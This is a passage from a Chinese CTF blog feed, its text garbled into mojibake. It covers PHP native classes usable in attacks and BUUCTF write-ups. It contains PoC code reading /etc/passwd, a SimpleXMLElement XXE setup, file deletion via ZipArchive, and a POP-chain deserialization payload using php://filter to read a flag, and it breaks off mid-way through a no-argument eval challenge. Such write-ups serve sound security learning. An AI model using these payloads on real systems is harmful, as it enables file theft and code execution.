title="Globlterator"></a>Globlterator</h1><p>ä¸filesystemlteratorå’Œdirectorylteratorä½œç”¨ç±»ä¼¼ï¼Œä¹Ÿå¯ä»¥éå†ä¸€ä¸ªæ–‡ä»¶ç›®å½•ï¼Œä½¿ç”¨æ–¹æ³•ä¸å‰ä¸¤ä¸ªä¹Ÿç±»ä¼¼</p><p>ä¸åŒçš„æ˜¯å…¶è¡Œä¸ºç±»ä¼¼glob()ï¼Œå¯ä»¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„</p><p><strong>ç±»æ‘˜è¦</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">GlobIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">FilesystemIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">SeekableIterator</span> , <span class="hljs-built_in">Countable</span> &#123;<br>    <span class="hljs-comment">/* æ–¹æ³• */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">KEY_AS_PATHNAME</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">CURRENT_AS_FILEINFO</span> )<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">count</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-comment">/* ç»§æ‰¿çš„æ–¹æ³• */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">KEY_AS_PATHNAME</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">CURRENT_AS_FILEINFO</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">SKIP_DOTS</span> )<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">current</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">getFlags</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">key</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">next</span> ( ) : <span class="hljs-keyword">void</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">rewind</span> ( ) : <span class="hljs-keyword">void</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">setFlags</span> ( <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = ? ) : <span class="hljs-keyword">void</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬çŸ¥é“flagæ–‡ä»¶åœ¨æ ¹ç›®å½•ï¼Œä½†æ˜¯ä¸çŸ¥é“flagæ–‡ä»¶çš„å®Œæ•´åï¼Œå¯ä»¥ä½¿ç”¨Globlterator(&#x2F;<em>flag</em>&#x2F;)</p><p><img src="/../images/20210809203839.png" alt="image-20210809203750996"></p><h1 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h1><p>ç”¨äºè§£æXMLæ–‡æ¡£ä¸­çš„å…ƒç´ </p><p>å®˜æ–¹æ–‡æ¡£å¯¹SimpleXMLElementç±»æ„é€ æ–¹æ³•SimpleXMLElement::__constructå®šä¹‰ï¼š</p><p><img src="/../images/image-20231215162830705.png" alt="image-20231215162830705"></p><p><img src="/../images/image-20231215162844688.png" alt="image-20231215162844688"></p><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸‰ä¸ªå‚æ•°data_is_urlä¸ºtrueï¼Œæˆ‘ä»¬å¯ä»¥å®ç°è¿œç¨‹xmlæ–‡ä»¶çš„è½½å…¥</p><p>ç¬¬äºŒä¸ªå‚æ•°çš„å¸¸é‡å€¼æˆ‘ä»¬è®¾ç½®ä¸º2å³å¯</p><p>ç¬¬ä¸€ä¸ªå‚æ•°dataå°±æ˜¯æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„payloadçš„urlåœ°å€ï¼Œç”¨äºå¼•å…¥å¤–éƒ¨å®ä½“çš„url</p><h1 id="SplFileInfo"><a href="#SplFileInfo" class="headerlink" title="SplFileInfo"></a>SplFileInfo</h1><ul><li>PHP5,7,8</li></ul><p>SplFileInfoç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†é«˜çº§çš„é¢å‘å¯¹è±¡æ¥å£</p><p>SplFileInfo::__toString  å°†æ–‡ä»¶è·¯å¾„ä½œä¸ºå­—ç¬¦ä¸²è¿”å›</p><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h1><p>SplFileObjectç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œç­‰</p><p>è¯¥ç±»çš„æ„é€ æ–¹æ³•å¯ä»¥æ„é€ ä¸€ä¸ªæ–°çš„æ–‡ä»¶å¯¹è±¡ç”¨äºåç»­çš„è¯»å–</p><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ZipArchive"><a href="#ZipArchive" class="headerlink" title="ZipArchive"></a>ZipArchive</h1><ul><li>PHP&gt;5</li></ul><p>å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©ä¸è§£å‹ç¼©</p><ul><li><code>ZipArchive::addEmptyDir</code>ï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„æ–‡ä»¶ç›®å½•</li><li><code>ZipArchive::addFile</code>ï¼šå°†æ–‡ä»¶æ·»åŠ åˆ°æŒ‡å®šzipå‹ç¼©åŒ…ä¸­</li><li><code>ZipArchive::addFromString</code>ï¼šæ·»åŠ æ–°çš„æ–‡ä»¶åŒæ—¶å°†å†…å®¹æ·»åŠ è¿›å»</li><li><code>ZipArchive::close</code>ï¼šå…³é—­ziparchive</li><li><code>ZipArchive::extractTo</code>ï¼šå°†å‹ç¼©åŒ…è§£å‹</li><li><code>ZipArchive::open</code>ï¼šæ‰“å¼€ä¸€ä¸ªzipå‹ç¼©åŒ…</li><li><code>ZipArchive::deleteIndex</code>ï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ï¼š<code>deleteIndex(0)</code>ä»£è¡¨åˆ é™¤ç¬¬ä¸€ä¸ªæ–‡ä»¶</li><li><code>ZipArchive::deleteName</code>ï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶åç§°ï¼ŒåŒæ—¶ä¹Ÿå°†æ–‡ä»¶åˆ é™¤</li></ul><p>æ¥çœ‹çœ‹ZipArchive::openæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">open</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> ] ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•ç”¨æ¥æ‰“å¼€ä¸€ä¸ªæ–°çš„æˆ–ç°æœ‰çš„zipå­˜æ¡£è¿›è¡Œè¯»å–ã€å†™å…¥ã€ä¿®æ”¹</p><ul><li><code>$filename</code>ï¼šè¦æ‰“å¼€çš„ZIPå­˜æ¡£çš„æ–‡ä»¶åã€‚</li><li><code>$flags</code>ï¼šç”¨äºæ‰“å¼€æ¡£æ¡ˆçš„æ¨¡å¼ã€‚æœ‰ä»¥ä¸‹å‡ ç§æ¨¡å¼ï¼š</li><li><code>ZipArchive::OVERWRITE</code>ï¼šæ€»æ˜¯ä»¥ä¸€ä¸ªæ–°çš„å‹ç¼©åŒ…å¼€å§‹ï¼Œæ­¤æ¨¡å¼ä¸‹å¦‚æœå·²ç»å­˜åœ¨åˆ™ä¼šè¢«è¦†ç›–æˆ–åˆ é™¤ã€‚</li><li><code>ZipArchive::CREATE</code>ï¼šå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºä¸€ä¸ªzipå‹ç¼©åŒ…ã€‚</li><li><code>ZipArchive::RDONLY</code>ï¼šåªè¯»æ¨¡å¼æ‰“å¼€å‹ç¼©åŒ…ã€‚</li><li><code>ZipArchive::EXCL</code>ï¼šå¦‚æœå‹ç¼©åŒ…å·²ç»å­˜åœ¨ï¼Œåˆ™å‡ºé”™ã€‚</li><li><code>ZipArchive::CHECKCONS</code>ï¼šå¯¹å‹ç¼©åŒ…æ‰§è¡Œé¢å¤–çš„ä¸€è‡´æ€§æ£€æŸ¥ï¼Œå¦‚æœå¤±è´¥åˆ™æ˜¾ç¤ºé”™è¯¯ã€‚</li></ul><p>å¦‚æœè®¾ç½®flagså€¼ä¸ºZipArchive::OVERWRITEçš„è¯ï¼Œå¯ä»¥åˆ é™¤æŒ‡å®šæ–‡ä»¶</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-variable">$a</span> = new Zip<span class="hljs-params">Archive</span>()<span class="hljs-comment">;</span><br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-literal">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-title function_">ZipArchive::OVERWRITE</span>)<span class="hljs-comment">;  </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æ–°ç”Ÿèµ›é‡åˆ°äº†ä¸€é“é¢˜éœ€è¦åˆ©ç”¨PHPåŸç”Ÿç±»ï¼Œç”±äºè‡ªå·±å¾ˆèœï¼ŒèŠ±äº†å¾ˆé•¿æ—¶é—´æ‰åšå‡ºæ¥ã€‚è¶å‘¨æœ«æœ‰æ—¶é—´æ€»ç»“ä¸€ä¸‹å¸¸è§çš„PHPåŸç”Ÿç±»&lt;/p&gt;
&lt;ul&gt;
&lt;li</summary>
      
    
    
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTFåˆ·é¢˜(æŒç»­æ›´æ–°)</title>
    <link href="http://example.com/2023/12/11/BUUCTF%E5%88%B7%E9%A2%98/"/>
    <id>http://example.com/2023/12/11/BUUCTF%E5%88%B7%E9%A2%98/</id>
    <published>2023-12-11T13:23:16.000Z</published>
    <updated>2024-03-08T08:46:16.936Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h1><p>ç›´æ¥å®¡è®¡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Happy New Year~ MAKE A WISH</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************pop your 2022*****************************/</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;effort = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**********************Try to See flag.php*****************************/</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ‰¾å¯ä»¥åˆ©ç”¨çš„ç‚¹</p><p>å‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">//åŒ…å«</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œå†æ‰¾å“ªé‡Œè°ƒç”¨äº†append()å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªè¦è§¦å‘__invoke()æ–¹æ³•ï¼Œå°±èƒ½è°ƒç”¨append()å‡½æ•°ï¼Œå¹¶ä¸”ä¼ å‚var</p><p>è¦è§¦å‘__invoke()æ–¹æ³•å¿…é¡»ä½¿å¯¹è±¡è¢«å½“ä½œå‡½æ•°è°ƒç”¨</p><p><strong>Make_a_Change</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŠŠ$functionå½“ä½œå‡½æ•°è°ƒç”¨ï¼Œä½†æ˜¯è¦è§¦å‘__get()æ–¹æ³•ï¼Œéœ€è¦<strong>è®¿é—®ä¸€ä¸ªå¯¹è±¡ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§</strong></p><p><strong>Road_is_Long</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœ$this-&gt;string&#x3D;Make_a_Changeçš„è¯ï¼Œé‚£ä¹ˆMake_a_Change-&gt;pageä¹Ÿå°±è®¿é—®äº†å…¶ä¸å­˜åœ¨çš„å±æ€§</p><p>è§¦å‘__toString()éœ€è¦<strong>ç±»è¢«å½“ä½œå­—ç¬¦ä¸²</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//ååºåˆ—åŒ–åæ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$String</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">protectecd <span class="variable">$var</span>=<span class="string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Make_a_Change</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;effort=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;String=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;page=<span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h1><p>è®¿é—®</p><p><img src="/../images/image-20231114092252163.png" alt="image-20231114092252163"></p><p>dirsearchæ‰«ç›®å½•</p><p><img src="/../images/image-20231114092318009.png" alt="image-20231114092318009"></p><p>.gitæ³„éœ²ï¼Œä¸ŠGithackï¼Œä¸‹è½½åˆ°index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¿‡æ»¤data filter php pharç­‰ä¼ªåè®®</p><p>è¿‡æ»¤åˆ†å·</p><p>è¿‡æ»¤et na info dec bin hex oct pi log</p><h2 id="åˆ©ç”¨session-idä»£æ›¿flag-php"><a href="#åˆ©ç”¨session-idä»£æ›¿flag-php" class="headerlink" title="åˆ©ç”¨session_idä»£æ›¿flag.php"></a>åˆ©ç”¨session_idä»£æ›¿flag.php</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 